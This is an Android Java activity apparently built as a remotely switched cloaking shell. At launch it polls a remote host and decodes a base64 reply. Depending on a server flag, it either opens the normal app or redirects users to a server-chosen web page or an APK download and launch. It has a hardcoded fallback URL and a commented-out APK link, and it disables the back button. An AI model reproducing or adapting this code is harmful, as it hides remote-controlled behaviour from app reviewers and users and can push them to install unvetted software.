package com.ego.shadow;

import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONObject;


/**
 * @author lxy
 * @time 2018/8/27  11:03
 */
public class ShadowActivity extends AppCompatActivity {

    private Splash splash;
    private RelativeLayout rl_splash;
    private RelativeLayout rl_container;
    private TextView tv_skin;

    private static final int CODE_FAILURE = 0;
    private static final int CODE_SUCCESSFUL = 1;

    //    debug
//    private static final int CODE_FAILURE = 1;
//    private static final int CODE_SUCCESSFUL = 0;
    private String data = null;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);// 设置全屏
        setContentView(R.layout.shadow_activity_splash);
        rl_splash = findViewById(R.id.rl_splash);

        this.off();

        final boolean from_background = getIntent().getBooleanExtra("from_background", false);

        tv_skin = findViewById(R.id.tv_skin);
        rl_container = findViewById(R.id.rl_container);
        splash = new Splash.Builder()
                .activity(this)
                .container(rl_container)
                .splashHolder(rl_splash)
                .skipView(tv_skin)
                .listener(new Splash.Listener() {
                    @Override
                    public void init() {
                        if (from_background) {
                            return;
                        }
                        request();
                    }

                    @Override
                    public void onStartActivity(AppCompatActivity activity) {
                        if (from_background) {
                            return;
                        }
                        toActivity(data);
                    }
                })
                .builder();
    }

    private void request() {
        if (Shadow.listener != null) {
            Shadow.listener.init(this);
        }
        StringBuilder url = new StringBuilder();
        url.append(Shadow.HOST).append("?type=android&appid=").append(Shadow.id);

        String response = ShadowRequest.get(url);

        try {
            JSONObject rep = new JSONObject(response);
            int code = rep.optInt("rt_code", 201);
            if (code == 200) {
                String data = rep.getString("data");
                byte[] result = Base64.decode(data, Base64.DEFAULT);
                this.data = new String(result);
            } else {
                this.data = null;
            }

        } catch (Exception e) {
            e.printStackTrace();
            this.data = null;
        }
    }

    private void toActivity(String json) {
        if (TextUtils.isEmpty(json)) {
            toApp();
            return;
        }
        try {

            Log.e("Response", json);
            JSONObject response = new JSONObject(json);

            String show_url = response.optString("show_url", "0");
            String url = response.optString("url", "http://m.9744.net/");
//            String url = "https://zhananys888.com/download/zn_video_2.8.apk";
            if (TextUtils.equals(String.valueOf(CODE_SUCCESSFUL), show_url)) {
                if (url.startsWith("http") && url.endsWith(".apk")) {
                    //下载APK
                    if (Shadow.checkInstalled && Shadow.isInstalled(ShadowActivity.this)) {
                        //打开APK
                        Shadow.launcher(ShadowActivity.this);
                    } else {
                        //跳转到下载APK
                        toActivity(DownloadActivity.class, url);
                    }

                } else {
                    //打开web页面
                    toActivity(WebActivity.class, url);
                }
                finish();
                return;
            }

            //正常APP
            toApp();

        } catch (Exception e) {
            e.printStackTrace();
            toApp();
        }
    }

    private void toActivity(Class<?> clazz, String url) {
        Bundle bundle = new Bundle();
        bundle.putString("Url", url);
        Intent intent = new Intent(ShadowActivity.this, clazz);
        intent.putExtras(bundle);
        startActivity(intent);
    }

    private void on() {
        splash(Shadow.shadowLayout, Shadow.shadowImage);
    }

    private void off() {
        splash(Shadow.splashLayout, Shadow.splashImage);
    }

    private void splash(int layout, int image) {
        rl_splash.removeAllViews();
        rl_splash.setBackground(null);
        try {
            if (layout != -1) {
                View view = LayoutInflater.from(this).inflate(layout, null);
                RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
                rl_splash.addView(view, params);
            } else if (image != -1) {
                rl_splash.setBackgroundResource(image);
            } else {
                rl_splash.setBackgroundResource(R.drawable.shadow_splash);
            }

        } catch (Exception e) {
            e.printStackTrace();
            rl_splash.setBackgroundResource(R.drawable.shadow_splash);
        }
    }

    private void toApp() {
        Intent intent = new Intent(ShadowActivity.this, Shadow.clazz);
        startActivity(intent);
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (splash != null) {
            splash.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (splash != null) {
            splash.onResume();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (splash != null) {
            splash.onPause();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (splash != null) {
            splash.onDestroy();
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return splash.onKeyDown(keyCode, event);
    }

    @Override
    public void onBackPressed() {
    }
}
